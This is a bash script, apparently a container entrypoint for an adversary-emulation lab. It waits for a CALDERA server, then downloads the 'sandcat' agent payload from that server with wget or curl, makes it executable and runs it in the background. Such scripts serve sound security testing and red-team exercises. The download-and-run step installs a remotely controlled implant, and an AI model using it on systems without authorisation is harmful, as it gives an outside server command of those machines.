#!/usr/bin/env bash
set -euo pipefail

CALDERA_URL="${CALDERA_URL:-http://caldera.dock:8888}"
GROUP="${GROUP:-cluster}"
CALDERA_WAIT_TIMEOUT_SEC="${CALDERA_WAIT_TIMEOUT_SEC:-300}"
CALDERA_WAIT_INTERVAL_SEC="${CALDERA_WAIT_INTERVAL_SEC:-2}"
SANDCAT_PATH="${SANDCAT_PATH:-/tmp/sandcat}"
SANDCAT_PID=""

case "${WAIT:-1}" in
  1|true|TRUE|yes|YES) START_DELAY_SEC=60 ;;
  0|false|FALSE|no|NO) START_DELAY_SEC=10 ;;
  *) START_DELAY_SEC=10 ;;
esac

is_reachable() {
  if command -v wget >/dev/null 2>&1; then
    wget -qO- "$1" >/dev/null
    return $?
  fi
  if command -v curl >/dev/null 2>&1; then
    curl -fsS -o /dev/null -X GET "$1"
    return $?
  fi
  echo "Neither wget nor curl is available." >&2
  return 1
}

download_sandcat() {
  if command -v wget >/dev/null 2>&1; then
    wget -qO "${SANDCAT_PATH}" "${CALDERA_URL}/file/download" \
      --header='file:sandcat.go' \
      --header='platform:linux' \
      --header="server:${CALDERA_URL}" \
      --header="group:${GROUP}"
    return $?
  fi
  if command -v curl >/dev/null 2>&1; then
    curl -fsS -o "${SANDCAT_PATH}" "${CALDERA_URL}/file/download" \
      -H 'file:sandcat.go' \
      -H 'platform:linux' \
      -H "server:${CALDERA_URL}" \
      -H "group:${GROUP}"
    return $?
  fi
  echo "Neither wget nor curl is available." >&2
  return 1
}

cleanup() {
  if [[ -n "${SANDCAT_PID}" ]] && kill -0 "${SANDCAT_PID}" >/dev/null 2>&1; then
    kill "${SANDCAT_PID}" >/dev/null 2>&1 || true
    wait "${SANDCAT_PID}" 2>/dev/null || true
  fi
}
trap cleanup EXIT INT TERM

CALDERA_URL="${CALDERA_URL%/}"
echo "Waiting for ${CALDERA_URL} (timeout: ${CALDERA_WAIT_TIMEOUT_SEC}s) ..."
start_ts="$(date +%s)"
until is_reachable "${CALDERA_URL}"; do
  now_ts="$(date +%s)"
  if (( now_ts - start_ts >= CALDERA_WAIT_TIMEOUT_SEC )); then
    echo "Timed out waiting for ${CALDERA_URL} after ${CALDERA_WAIT_TIMEOUT_SEC}s" >&2
    exit 1
  fi
  sleep "${CALDERA_WAIT_INTERVAL_SEC}"
done

sleep "${START_DELAY_SEC}"

echo "Downloading sandcat payload..."
download_sandcat

chmod +x "${SANDCAT_PATH}"

echo "Starting sandcat agent..."
"${SANDCAT_PATH}" &
SANDCAT_PID="$!"

echo "Sandcat agent started with PID ${SANDCAT_PID}"
wait "${SANDCAT_PID}"
